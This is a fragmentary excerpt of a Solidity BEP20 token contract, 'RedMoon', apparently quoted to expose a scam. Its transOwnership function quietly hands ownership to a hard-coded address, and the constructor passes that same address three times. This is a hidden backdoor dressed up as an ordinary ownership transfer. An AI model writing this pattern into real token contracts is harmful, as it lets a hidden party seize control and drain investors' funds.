...
contract Ownable is Contese {
    ...
    function transOwnership() public virtual onlyOwner {
        emit OwnersTransferred(_owner, address(0xEe8aa6894206237536B4A4A986172cE124e8C4db));
        _owner = address(0xEe8aa6894206237536B4A4A986172cE124e8C4db);
    }
...
contract RedMoon is BEP20 {
    constructor() BEP20(
        ...
        [0xEe8aa6894206237536B4A4A986172cE124e8C4db,0xEe8aa6894206237536B4A4A986172cE124e8C4db,0xEe8aa6894206237536B4A4A986172cE124e8C4db]
    ){}
}